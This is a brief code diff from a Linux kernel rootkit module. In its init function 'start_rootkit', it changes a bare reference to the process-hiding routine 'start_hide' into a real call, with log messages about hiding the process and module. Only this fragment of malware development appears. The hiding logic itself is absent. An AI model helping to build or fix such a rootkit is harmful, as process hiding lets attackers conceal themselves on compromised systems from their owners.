@@ -56,7 +56,7 @@ static int __init start_rootkit(void)
         return -1;
     }
     printk(KERN_ALERT "rk: hide the proces!");
-    ret = start_hide;
+    ret = start_hide();
     printk("module hide");
     return 0;
 
